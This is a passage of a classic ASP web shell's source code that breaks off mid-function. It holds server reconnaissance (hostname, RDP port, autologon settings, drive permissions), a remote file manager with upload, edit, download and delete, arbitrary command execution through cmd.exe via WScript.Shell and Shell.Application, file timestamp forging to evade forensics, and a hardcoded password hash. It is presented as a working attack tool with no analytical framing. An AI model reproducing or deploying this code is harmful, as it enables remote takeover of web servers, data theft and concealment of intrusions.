			<td bgcolor=#d0d0d0><b>Cpu Cores</b></td>
			<td style='color:#0000ff'>
				<% response.write prs_num%>
			</td>
			<td bgcolor=#d0d0d0><b>Apps & Sessions</b></td>
			<td style='color:#0000ff'>
				<% response.write "Apps:"&CStr(Application.Contents.count)&" Sessions:"&CStr(Session.Contents.count)&" Current SessionID:"&CStr(Session.SessionId)%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Cpu Details</b></td>
			<td style='color:#0000ff'>
				<% response.write objEnv("PROCESSOR_IDENTIfIER")%>
			</td>
			<td bgcolor=#d0d0d0><b>Server Environments</b></td>
			<td style='color:#0000ff'>
				<% response.write objws.Environment.Count%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Host Name</b></td>
			<td style='color:#0000ff'>
				<% response.write objws.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")%>
			</td>
			<td bgcolor=#d0d0d0><b>Terminal Service Port</b></td>
				<% port = objWs.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber")
				If (doNetScan("127.0.0.1", port) = 1) Then
					Response.write "<td style='color:blue'>"&port&" opened"
				Else
					Response.write "<td style='color:red'>"&port&" closed"
				End If
				%>
			</td>
		</tr>
		<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td bgcolor=#d0d0d0><b>Manager</b></td>
			<td style='color:#0000ff'>
				<% response.write AltDefaultUserName&tmp&"User Name"%>
			</td>
			<td bgcolor=#d0d0d0><b>Automatic User Login</b></td>
			<td style='color:#0000ff'>
				<% response.write AutoAdminLogon%>
			</td>
		</tr>
	</table>
	</td></tr>
	<tr><td>
	<table width=100% align=left cellspacing=0>
		<tr align=center class='alt0'><td colspan=2>Current System Path</td></tr>
<%		index = 0
		For Each x In SysPathArray
			If x <> "" Then			
				If index Mod 2 = 0 Then%>
					<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
<%				End If%>
				<td width=50% style='color:#0000ff'><% response.write x%></td>
<%				If index Mod 2 = 1 Then%>
					</tr>
<%				End If
				index = index + 1
			End If
		Next
		If index Mod 2 = 0 Then%>
			</tr>
<%		End If%>
	</table>
	</td></tr>
	<tr><td>
	<table width=100% align=left cellspacing=0>
		<tr align=center class='alt0' align=center><td colspan=5>Driver Accessibility</td></tr>
		<tr class='alt2'>
		<td width=30%><b>Directory</b></td><td width=30%><b>Type</b></td><td width=30%><b>Size</b></td><td width=5%><b>Readable</b></td><td width=5%><b>Writable</b></td>
		</tr>
		<%For Each x In objFSO.Drives
			%><tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
			<td style='color:#0000ff'><% response.write x%></td>
			<td style='color:#0000ff'><%
				select case x.DriveType 
				case 0
					Response.Write("UNKNOWN") 
				case 1
					Response.Write("REMOVABLE") 
				case 2
					Response.Write("FIXED") 
				case 3
					Response.Write("NETWORK") 
				case 4
					Response.Write("CDROM") 
				case 4
					Response.Write("RAMDISK") 
				end select%></td>
			<%
				if x.IsReady = FALSE then 
					Response.Write("<td style='color:#ff0000'>NOT READY") 
				else 
					FreeSpace = ChangeBytes(x.FreeSpace) 
					TotalSize = ChangeBytes(x.TotalSize) 
					Response.Write("<td style='color:#0000ff'>"&FreeSpace & " free / " & TotalSize & " total") 
				end if%></td>
			<%If readable(x&"\") = 0 Then
			%>	<td style='color:#ff0000'>x</td>
			<%Else%>
				<td style='color:#0000ff'>O</td>
			<%End If%>
			<%If writable(x&"\") = 0 Then
			%>	<td style='color:#ff0000'>x</td>
			<%Else%>
				<td style='color:#0000ff'>O</td>
			<%End If%>
			</tr><%
		Next%>
	</table>
	</td></tr>
	<tr><td>
		<table width=100% align=left cellspacing=0>
		<tr class='alt0' align=center><td colspan=2>Common Objects Check</td></tr>
<%			index = 0
			For Each x In common_object
				If index Mod 2 = 0 Then%>
					<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
<%				End If
				If usuable(x) = 0 Then%>
					<td width=50% style='color:#ff0000'>x <% response.write x%></td>
<%				Else%>
					<td width=50% style='color:#0000ff'>O <% response.write x%></td>
<%				End If
				If index Mod 2 = 1 Then%>
					</tr>
<%				End If
				index = index + 1
			Next
			If index Mod 2 = 0 Then%>
				</tr>
<%			End If%>
		</table>
	</td></tr>
	</table>
<%
	Set objFSO = Nothing
	Set objWS = Nothing
ErrAlert
End Function

Function GetFileTypeName(FldName)
On Error Resume Next
	If InStr(FldName, ".") > 0 Then
		Dim FiNameStr
		FiNameStr = Split(FldName,".")
		GetFileTypeName = Lcase(FiNameStr(UBound(FiNameStr)))
	Else
		GetFileTypeName = "unknow"
	End If
ErrAlert
End Function

Function GetContentType(FlName)
On Error Resume Next
	Select Case GetFileTypeName(flName)
	Case "asf"
		GetContentType = "video/x-ms-asf"
	Case "avi"
		GetContentType = "video/avi"
	Case "doc"
		GetContentType = "application/msword"
	Case "zip"
		GetContentType = "application/zip"
	Case "xls"
		GetContentType = "application/vnd.ms-excel"
	Case "gif"
		GetContentType = "image/gif"
	Case "jpg", "jpeg"
		GetContentType = "image/jpeg"
	Case "wav"
		GetContentType = "audio/wav"
	Case "mp3"
		GetContentType = "audio/mpeg3"
	Case "mpg", "mpeg"
		GetContentType = "video/mpeg"
	Case "rtf"
		GetContentType = "application/rtf"
	Case "htm", "html"
		GetContentType = "text/html"
	Case "txt"
		GetContentType = "text/plain"
	Case Else
		GetContentType = "application/octet-stream"
	End Select
ErrAlert
End Function

Sub fnDownload(FilePath, FileName)
On Error Resume Next
	Set objAS = CreateObject("ADODB.Stream")
	objAS.Open
	objAS.Type = 1
	objAS.LoadFromFile(FilePath)
	objAS.Position = 0
	FileContentType = GetContentType(FilePath)
	IsAttachment = "attachment; "
	Response.Clear
	Response.AddHeader "Content-Disposition", IsAttachment & "filename=" & FileName
	Response.AddHeader "Content-Length", objAS.Size
	Response.Charset = "UTF-8"
	Response.ContentType = FileContentType
	Response.BinaryWrite objAS.Read
	Response.Flush
	objAS.Close
	Set objAS = Nothing
ErrAlert
End Sub

Sub doDownload(filename, path)
On Error Resume Next
	If filename = "" Then Exit Sub
	If path = "" Then Exit Sub

	FilePath = path&"\"&filename
	fnDownload FilePath, filename
ErrAlert
End Sub

Sub doEdit(filename, path)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
%>
	<form method='POST' name='form_folder_edit' action='' align=center>
	<input type=hidden name='submit1'>
	<input type=hidden name='submit2'>
	<input type=hidden name='submit3'>
	<input type=hidden name='submit4'>
	<br><b><% response.write filename%></b>

<%	If filename = "" Then Exit Sub
	If path = "" Then Exit Sub
	FilePath = path&"\"&filename
	If Decode(request.form("submit4")) = "SAVE" Then
		Set T = objFSO.CreateTextFile(FilePath)
		T.Write request.form("Content")
		T.Close
		Set T = nothing
	End If
	Set T = objFSO.OpenTextFile(FilePath, 1, false)
	If Not IsObject(T) Then
		runJScript("history.go(-1);")
		Exit Sub
	End If
	Response.Charset = "UTF-8"%>
	<textarea name=Content style='width:100%;height:86%;'><%
	If Not T.AtEndOfStream Then
		response.write html_encode(T.ReadAll)
	End If%></textarea>
<%	T.Close
	Set T = Nothing
%>
	<input type=button name='save' value=' Save ' onclick="saveedit('<% response.write Encode(filename)%>')">
	<input type=button name='back' value=' Back ' onclick='showFolder()'>`
	</form>

<%	Set objFSO = Nothing
ErrAlert
End Sub

Sub doDeleteFile(FilePath)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	If FilePath = "" Then Exit Sub
	Call objFSO.DeleteFile(FilePath,1)
	Set objFSO = Nothing
ErrAlert
End Sub

Sub doDeleteFolder(FolderPath)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	If FolderPath = "" Then Exit Sub
	Call objFSO.DeleteFolder(FolderPath,1)
	Set objFSO = Nothing
ErrAlert
End Sub

Sub doSelDel()
On Error Resume Next
	Count = request.form("count")
	For i = 1 To Count
		If request.form("tp_"&i) = "FOLD" Then
			doDeleteFolder(Decode(request.form("dl_"&i)))
		ElseIf request.form("tp_"&i) = "FILE" Then
			doDeleteFile(Decode(request.form("dl_"&i)))
		End If
	Next
ErrAlert
End Sub

Sub runJScript(script)
	Response.write vbNewLine & "<script type=""text/javascript"">" & script & "</script>" & vbNewLine
End Sub

Sub alertStr(str)
	runJScript("alert("""&str&""");")
End Sub

Sub createFile(newname,path)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Call objFSO.CreateTextFile(path&newname,True)
	Set objFSO = Nothing
ErrAlert
End Sub

Sub createFolder(newname,path)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Call objFSO.CreateFolder(path&newname)
	
	Set objFSO = Nothing
ErrAlert
End Sub

Sub doCreate(path)
On Error Resume Next
	newname = Decode(request.form("submit4"))
	Select Case Decode(request.form("submit3"))
	Case "FILE"
		Call createFile(newname,path)
		Call doEdit(newname,path)
	Case "FOLDER"
		Call createFolder(newname,path)
	Case Else
	End Select
ErrAlert
End Sub

Class FileUploader
	Public	sFilePath
    Public  Files
    Private mcolFormElem

    Private Sub Class_Initialize()
	On Error Resume Next
        Set Files = Server.CreateObject("Scripting.Dictionary")
        Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	ErrAlert
    End Sub
    
    Private Sub Class_Terminate()
	On Error Resume Next
        If IsObject(Files) Then
            Files.RemoveAll()
            Set Files = Nothing
        End If
        If IsObject(mcolFormElem) Then
            mcolFormElem.RemoveAll()
            Set mcolFormElem = Nothing
        End If
	ErrAlert
    End Sub

    Public Property Get Form(sIndex)
        Form = ""
        If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
    End Property

    Public Default Sub Upload()
	On Error Resume Next

        Dim biData, sInputName
        Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
        Dim nPosFile, nPosBound, objAS, objAS1

        biData = Request.BinaryRead(Request.TotalBytes)
		Response.write "TotalBytes:"&Request.TotalBytes & "<br>"
		Response.write "biData:"&CWideString(biData) & "<br>"
		Set objAS = CreateObject("ADODB.Stream")
		objAS.Type = 1
		objAS.Open
		objAs.write biData
		objAs.position = 0
		objAS.Flush

        nPosBegin = 1
        nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
        
        If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
        vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		Response.write "vDataBounds:"&CWideString(vDataBounds) & "<br>"

        nDataBoundPos = InstrB(biData, vDataBounds)
		If nDataBoundPos = 0 Then
			alertStr("The file has not been uploaded.")
			Exit Sub
		End If
		nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
		nPos = InstrB(nPos, biData, CByteString("name="))
		nPosBegin = nPos + 6

		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
		sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
		Response.write "sInputName:"&sInputName & "<br>"

		nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
		nPosBound = InstrB(nPosEnd, biData, vDataBounds)

		nPosPathBegin = InStrB(nPosBound, biData, CByteString("name=""fn"""))
		nPosPathBegin = nPosPathBegin + 12
		nPosPathEnd = InstrB(nPosPathBegin, biData, vDataBounds)
		nPosPathEnd = nPosPathEnd - 3
		nPathLen = nPosPathEnd-nPosPathBegin
		
		Set objAS1=CreateObject("ADODB.Stream"): objAS1.Type=1: objAS1.Mode=3: objAS1.Open
		objAS.Position = nPosPathBegin
		objAS.CopyTo objAS1, nPathLen
		objAS1.Position=0: objAS1.Type=2: objAS1.Charset="UTF-8"
		sFilePath = objAS1.ReadText
		Response.write "sFilePath:"&sFilePath & "<br>"
		objAS1.Close
		Set objAS1 = nothing
		If nPosFile <> 0 And  nPosFile < nPosBound Then
			Dim oUploadFile, sFileName
			Set oUploadFile = New UploadedFile
			
			nPosBegin = nPosFile + 10
			nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			Response.write "sFileName:"&sFileName & "<br>"

			oUploadFile.FileName = Right(sFilePath, Len(sFilePath)-InStrRev(sFilePath, "\"))

			nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
			nPosBegin = nPos + 14
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
			
			oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			
			nPosBegin = nPosEnd+3
			nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 3

			oUploadFile.biData = biData
			oUploadFile.nBiBegin = nPosBegin
			oUploadFile.nBiEnd = nPosEnd

			If oUploadFile.FileSize > 0 Then
				Files.Add LCase(sInputName), oUploadFile
			Else
				alertStr "The empty file cannot be uploaded!"
				Exit Sub
			End If
			ErrAlert
		Else
			nPos = InstrB(nPos, biData, CByteString(Chr(13)))
			nPosBegin = nPos + 4
			nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
			If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
		End If

		objAS.Close
		Set objAS = Nothings
    End Sub

    'String to byte string conversion
    Private Function CByteString(sString)
        Dim nIndex
        For nIndex = 1 to Len(sString)
           CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
        Next
    End Function

    'Byte string to string conversion
    Private Function CWideString(bsString)
        Dim nIndex
        CWideString =""
        For nIndex = 1 to LenB(bsString)
           CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
        Next
    End Function
End Class

Class UploadedFile
    Public ContentType
    Public FileName
	Public biData
	Public nBiBegin
	Public nBiEnd
	
	Public Function FileSize()
		FileSize = nBiEnd - nBiBegin
	End Function

    Public Sub SaveToDisk(sPath)
	On Error Resume Next
        Dim oFS, oFile
        Dim nIndex

        If sPath = "" Or FileName = "" Then Exit Sub
        If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
    
        Set oFS = Server.CreateObject("Scripting.FileSystemObject")
        If Not oFS.FolderExists(sPath) Then Exit Sub
        
		Set objAS = Server.CreateObject("ADODB.Stream")
		objAS.Type = 1 : objAS.Mode = 3 : objAS.Open
		objAS.Write biData
		objAS.Flush
		objAS.Position = nBiBegin
		Set objAS1 = Server.CreateObject("ADODB.Stream")
		objAS1.Type = 1 : objAS1.Mode = 3 : objAS1.Open : objAS1.Position = 0
		objAS.CopyTo objAS1,nBiEnd-nBiBegin
		objAS1.SaveToFile sPath&FileName,1
		objAS.Close
		objAS1.Close
		Set objAS = Nothing
		Set objAS1 = Nothing
	ErrAlert
    End Sub
End Class

Sub doUpload()
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Dim Uploader, File, FileSys, FilePath
	Set Uploader = New FileUploader

	Uploader.Upload()
	If Uploader.Files.Count <> 0 Then
		For Each File In Uploader.Files.Items
			FilePath = Uploader.sFilePath
			If objFSO.FileExists(FilePath) then 
				alertStr("Sorry filename:"& File.FileName &" is already exists!  Please rename your local file.")
			Else
				FilePath = Left(FilePath, InStrRev(FilePath,"\"))
				File.SaveToDisk FilePath
				ErrAlert
			End If
		Next
	End If
	Set objFSO = Nothing
ErrAlert
End Sub

Function formFolderElement(cur_path, smt2, smt3)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
%>
	<form method='POST' action='' name='form_folder_go'>
		<table width=100% align=center>
			<tr height=10px>
			<td>Location:</td>
			<td width=90%>
				<input type=text name='golocation' style='width:100%' value='<% response.write cur_path%>' onkeydown="if (event.keyCode == 13) goFolder('');">
			</td>
			<td width=10%>
				<input type=button name='go' value='GO' onclick="goFolder('')">
			</td>
			</tr>
		</table>
	</form>
	<table width=100%>
	<tr><td></td>
	<td>
		<table cellspacing=0 width=100% align=left>
			<tr class='alt2'>
			<td>
			<form method='POST' action='' name='form_folder_create'>
				<b>Create:</b>
				<input type=radio name=RadioOption id=radio_file checked>File
				<input type=radio name=RadioOption id=radio_folder>Folder
				<input type=text name='newname' value='New' style='width:80pt' onkeydown="if (event.keyCode == 13) createNew();">
				<input type=button name='create' value='Create' onclick="createNew();">
			</form>
			</td>
			<td>
			<form method="POST" action="" name="form_folder_upload" enctype="multipart/form-data">
				<b>Upload:</b>
				<input type="file" size="50" name="file1" style='width:150pt' onchange="javascript:fn.value='<% response.write Replace(Replace(cur_path&"\","\\","\"),"\","\\")%>'+this.value.split('\\')[this.value.split('\\').length-1]">
				to<input type="text" name="fn">
				<input type="submit" value="Upload">
			</form>
			</td>
				<%If smt2 = "FORMCHANGEMD" Then%>
					<td>
					<form method='POST' action='' name='form_folder_date'>
					<b>Date:</b>
					<input type=text name='newdate' value='<%Response.write "2000-01-01 00:00:01 AM"%>'>
					<input type=button name='btn_changemd' value='Change' onclick="changeMD('<% response.write Encode(smt3)%>')">
					<input type=button name='btn_copymd' value='Copy' onclick="copyMD('<% response.write Encode(smt3)%>')">
					<%If session("md") <> "" Then%>
					<input type=button name='btn_pastemd' value='Paste' onclick="pasteMD('<% response.write Encode(smt3)%>')">
					</form>
					</td>
					<%End If%>
				<%End If%>
			</tr>
		</table>
	</td>
	</tr>

	<tr align=left valign=top>
	<td>
		<form method='POST' action='' name='form_folder_driver'>	
			<table width=100% align=left cellspacing=0>
				<tr align=center class='alt0'><td>Name</td><td>Type</td></tr>
	<%
				strComputer = "."
				Set colDrivers = objFSO.Drives
				For Each driver In colDrivers
	%>
					<tr align=center class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'><td>
					<%
					If driver.IsReady = True Then %>
						<a href="javascript:goFolder('<% response.write Encode(driver.driveletter&":\")%>');"><% response.write driver.driveletter%>:</a>
	<%				Else%>
						<% response.write driver.driveletter%>:
	<%				End If%>
					</td><td><%
						select case driver.DriveType 
						case 0
							Response.Write("UNKNOWN") 
						case 1
							Response.Write("REMOVABLE") 
						case 2
							Response.Write("FIXED") 
						case 3
							Response.Write("NETWORK") 
						case 4
							Response.Write("CDROM") 
						case 4
							Response.Write("RAMDISK") 
						end select%></td></tr>
	<%
				Next
	%>
				<tr align=center class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'><td colspan=2>
				<a href="javascript:goFolder('<% response.write Encode(server.mappath("/"))%>');">
				Web Root
				</a>
				</td></tr>

				<tr align=center class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'><td colspan=2>
				<a href="javascript:goFolder('<% response.write Encode(server.mappath("."))%>');">
				Shell Path
				</a>
				</td></tr>
			</table>
		</form>
	</td>
	<td>
		<form method='POST' action='' name='form_filelist'>
			<input type=hidden name="submit1" value='<%Response.write Encode("FOLDER")%>'>
			<input type=hidden name="submit2" value='<%Response.write Encode("SELDEL")%>'>
			<table width=100% cellspacing=0 align=left>
				<tr align=left class='alt0'><td></td><td width='30pt'>Name</td><td>Size</td><td>Type</td><td>Modified Date</td><td>Operations</td></tr>
	<%
				Set fod1 = objFSO.GetFolder(cur_path)
				If Len(cur_path) > 3 Then
					res = Left(cur_path, InStrRev(cur_path, "\") - 1)
					If Right(res, 1) = ":" Then res = res & "\"
	%>
					<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
					<td></td>
					<td>
					<a href="javascript:goFolder('<% response.write Encode(res)%>')">[ . . ]</a>
					</td>
					<td>
					</td>
					<td>
					</td>
					<td>
					</td>
					<td>
					</td>
					</tr>
	<%
				End if
				Count = 0
				For Each co In fod1.SubFolders
					name = co.Name
					Count = Count + 1
	%>
					<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
					<td width=30pt align=center><input type=checkbox name="dl_<%Response.write Count%>" value="<%Response.write Encode(Replace(cur_path&"\"&name,"\\","\"))%>"><input type=hidden name="tp_<%Response.write Count%>" value="FOLD"></td>
					<td>
					<a href="javascript:goFolder('<% response.write Encode(Replace(cur_path&"\"&name,"\\","\"))%>')" 
<%					If (DateDiff("h", co.DateLastModified, Now()) = 0) Then%>
						style="color:red"
<%					End If%>
					><% response.write name%>
					</a>
					</td>
					
					<td></td>
					<td></td>
					<td><% response.write co.DateLastModified%></td>
					<td align=left><a href="javascript:deletefolder('<% response.write Encode(name)%>')">
					Delete</a>
					</td>
					</tr>
	<%
				Next%>
				<tr bgcolor=#c0c0c0 height=5pt><td colspan=6></td></tr>
<%				For Each co In fod1.Files
					Count = Count + 1
	%>
					<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
					<td width=30pt align=center><input type=checkbox name="dl_<%Response.write Count%>" value="<%Response.write Encode(Replace(cur_path&"\"&co.Name,"\\","\"))%>"><input type=hidden name="tp_<%Response.write Count%>" value="FILE"></td>
					<td><a href="javascript:download('<% response.write Encode(co.Name)%>')" 
<%					If (DateDiff("h", co.DateLastModified, Now()) = 0) Then%>
						style='color:red'
<%					End If%>
					><% response.write co.Name%>
					</a></td>

					<td><% response.write ChangeBytes(co.Size)%></td>
					<td><% response.write co.Type%></td>

					<td><a href="javascript:formChangeMD('<% response.write Encode(co.Name)%>')"><% response.write co.DateLastModified%></a></td>
					<td align=left><a href="javascript:edit('<% response.write Encode(co.Name)%>')">
					Edit</a> | <a href="javascript:deletefile('<% response.write Encode(co.Name)%>')">
					Delete</a></td>
					</tr>
<%				Next%>
				<tr bgcolor=#c0c0c0 height=5pt><td colspan=6></td></tr>
				<tr class='alt1' onmouseover='this.className="alt2"' onmouseout='this.className="alt1"'>
				<td width=30pt align=center><input type=checkbox name="chkall" onclick="javascript:checkAll(this.form);"></td><td><a href="javascript:onFilesDelete();" style="color:green">Delete selected file</a></td><td></td><td></td><td></td><td></td></tr>
			</table>
		<input type=hidden name="count" value="<%Response.write Count%>">
		</form>
	</td>
	</tr>
	</table>

<%
	
	Set objFSO = Nothing
ErrAlert
End Function

Function ChangeBytes(numCB) 
	numCBK = fix(numCB / 10.24) / 100 
	numCBM = fix(numCBK / 10.24) / 100 
	numCBG = fix(numCBM / 10.24) / 100 

	if numCBK < 1 then 
		strResultCB = numCB & " Bytes" 
	elseif numCBM < 1 then 
		strResultCB = numCBK & " KB" 
	elseif numCBG < 1 then 
		strResultCB = numCBM & " MB" 
	else 
		strResultCB = numCBG & " GB" 
	end if 
	ChangeBytes = strResultCB 
End function 

Function formFolder()
On Error Resume Next
	smt2 = Decode(request.form("submit2"))
	smt3 = Decode(request.form("submit3"))
	smt4 = Decode(request.form("submit4"))
	If smt2 = "GO" Then
		If smt3 <> "" Then
			session("location") = smt3
		ElseIf session("location") = "" Then
			session("location") = server.mappath(".")
		End If
	ElseIf smt2 = "" Then
		session("location") = server.mappath(".")
	End If
	cur_path = session("location")

	Select Case smt2
	Case "DOWNLOAD"
		Call doDownload(smt3,cur_path)
	Case "EDIT"
		Call doEdit(smt3,cur_path)
		Exit Function
	Case "DELETE"
		Call doDeleteFile(Replace(cur_path&"\"&smt3,"\\","\"))
	Case "DELFOLD"
		Call doDeleteFolder(Replace(cur_path&"\"&smt3,"\\","\"))
	Case "SELDEL"
		doSelDel()
	Case "CREATE"		
		doCreate(cur_path+"\")
		If smt3 = "FILE" Then Exit Function
	Case "CHANGEMD"
		modifyLastAccessedDate cur_path&"\"&smt3, smt4
	Case "COPYMD"
		session("md") = getLastAccessedDate(cur_path&"\"&smt3)
	Case "PASTEMD"
		modifyLastAccessedDate cur_path&"\"&smt3, session("md")
	Case Else
	End Select
	formFolderElement cur_path, smt2, smt3
ErrAlert
End Function

Function makePrimaryList()
%>
	<table width=100% align=center bgcolor=#e0e0e0>
	<tr bgcolor=#c0c0c0>
	<td colspan=3 align=left><b><% Response.write SV_Var("SERVER_NAME")%></b></td>
	<td colspan=4 align=right><b><%
	Set objWs = CreateObject("WScript.Shell")
	Set objEnv = objws.Environment("SYSTEM")
	Response.write CStr(objEnv("OS"))
	Set objEnv = nothing%></b></td>
	</tr>
	<tr class='alt1'>
	<td width=14% align=center><a href='javascript:showFolder();'><b>Explorer</b></a></td>
	<td width=14% align=center><a href='javascript:showCMD();'><b>Command</b></a></td>
	<td width=14% align=center><a href='javascript:showDatabase();'><b>Database</b></a></td>
	<td width=14% align=center><a href='javascript:showNetScan();'><b>Connection Test</b></a></td>
	<td width=14% align=center><a href='javascript:showUrlDownload();'><b>URL Download</b></a></td>
	<td width=14% align=center><a href='javascript:showServerInfo();'><b>Server Infomation</b></a></td>
	</tr>
	</table>
<%
End Function

Sub modifyLastAccessedDate(FilePath, newDate)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objSA = CreateObject("Shell.Application")
    Set file = objFSO.GetFile(FilePath)
	tmp = file.ParentFolder
	If Right(file.ParentFolder,1) <> "\" Then tmp = file.ParentFolder & "\"
    Set folder = objSA.NameSpace(tmp)

    Set fileModify = folder.ParseName(file.Name) 
    fileModify.ModifyDate = newDate
    Set file = Nothing 
    Set folder = Nothing
    Set fileModify = Nothing
	
	Set objFSO = Nothing
	Set objSA = Nothing
ErrAlert
End Sub

Function getLastAccessedDate(FilePath)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objSA = CreateObject("Shell.Application")

    Set file = objFSO.GetFile(FilePath)
	tmp = file.ParentFolder
	If Right(file.ParentFolder,1) <> "\" Then tmp = file.ParentFolder & "\"
    Set folder = objSA.NameSpace(tmp)
    Set fileModify = folder.ParseName(file.Name)
    getLastAccessedDate = fileModify.ModifyDate

    Set file = Nothing 
    Set folder = Nothing
    Set fileModify = Nothing
	Set objSA = nothing
	Set objFSO = Nothing
ErrAlert
End Function

Function execCMD_WScript(cmd)
On Error Resume Next
	Set objWS = CreateObject("WScript.Shell")
	If cmd <> "" Then
		cmd = Decode(Request.Form("submit3")) & " " & cmd & " 2>&1"
		Set re = objWS.exec(cmd)
		execCMD_WScript = html_encode(re.stdout.readall)
	Else
		execCMD_WScript = ""
	End If
	Set objWS = Nothing
ErrAlert
End Function
	
Function execCMD_NonWScript(cmd)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWS = CreateObject("WScript.Shell")
	If cmd <> "" Then
		tmpFile = objWS.ExpandEnvironmentStrings("%TEMP%") & "\" & objFSO.GetTempName
		cmd = Decode(Request.Form("submit3")) & " " & cmd & " > " & tmpFile & " 2>&1"
		objWS.run cmd, 0 ,True
		execCMD_NonWScript = html_encode(objFSO.OpenTextFile(tmpFile,1,False,0).ReadAll)
	Else
		execCMD_NonWScript = ""
	End If
	objFSO.DeleteFile tmpFile, True
	
	Set objFSO = Nothing
	Set objWS = Nothing
ErrAlert
End Function

Function execCMD_Shell(cmd)
On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objSA = CreateObject("Shell.Application")

	If cmd <> "" Then
'		tmpFile = objFSO.GetSpecialFolder(2) & "\q5v3u.tmp"
		cmd = cmd & " 2>&1"
		Call objSA.ShellExecute(Decode(Request.Form("submit3")), cmd, "", "open", 1)

		execCMD_Shell = "Command has been executed by Shell.Application."
	Else
		execCMD_Shell = "Empty command."
	End If

'	objFSO.DeleteFile tmpFile, True
	Set objSA = nothing
	Set objFSO = Nothing
ErrAlert
End Function

Function formCMD()
On Error Resume Next
	cmd = Decode(Request.Form("submit4"))
	If cmd = "" Then
		If session("cmd") = "" Then session("cmd") = "/c set"
	Else
		session("cmd") = cmd
	End If

	cmdpath = Decode(Request.Form("submit3"))
	If cmdpath = "" Then
		If session("cmdpath") = "" Then session("cmdpath") = "C:\Windows\system32\cmd.exe"
	Else
		session("cmdpath") = cmdpath
	End If
	
	Select Case Decode(Request.Form("submit2"))
	Case "NONWSCRIPT"
		rslt = execCMD_NonWScript(cmd)
	Case "WSCRIPT"
		rslt = execCMD_WScript(cmd)
	Case "SHELL"
		rslt = execCMD_Shell(cmd)
	End Select
%>
	<Table width=100% height=97% align=left>
	<Form method='POST' action='' name='form_cmd'>
		<tr>
			<td width=80%>
				<input type="text" name='cmdpath' style='width:100%' value='<% response.write session("cmdpath")%>'>
			</td>
			<td width=10%>
				<input type='checkbox' id='check_wscript' value='WScript.Shell' <%
				If Decode(Request.Form("submit2")) <> "NONWSCRIPT" Then Response.write "checked"%>>WScript.Shell
			</td>
			<td width=10%></td>
		</tr>
		<tr>
			<td>
				<input type="text" name='cmd' style='width:100%' value='<% response.write session("cmd")%>' onkeydown="if (event.keyCode == 13) javascript:submitCMD();">
			</td>
			<td>
				<input type='button' value='Exec' style='width:100%' onclick='javascript:submitCMD()'>
			</td>
			<td>
				<input type='button' value='Exec(Shell.App)' style='width:100%' onclick='javascript:submitCMD1()'>
			</td>
		</tr>
		<tr>
			<td colspan='3' height=100% align=center><textarea name='cmd_result' readonly style='width:100%;height:100%;'><% response.write rslt%></textarea></td>
		</tr>
	</Form>
	</Table>
<%
ErrAlert
End Function

Const password = "JZHJi3ARn+YkiYseQktekQ=="
Function BytesToBase64(varBytes)
    With CreateObject("MSXML2.DomDocument").CreateElement("b64")
        .dataType = "bin.base64"
        .nodeTypedValue = varBytes
        BytesToBase64 = .Text
    End With
End Function

Function md5hashBytes(aBytes)
    Dim MD5
    set MD5 = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")

    MD5.Initialize()
    md5hashBytes = MD5.ComputeHash_2((aBytes))
End Function

Function stringToUTFBytes(aString)
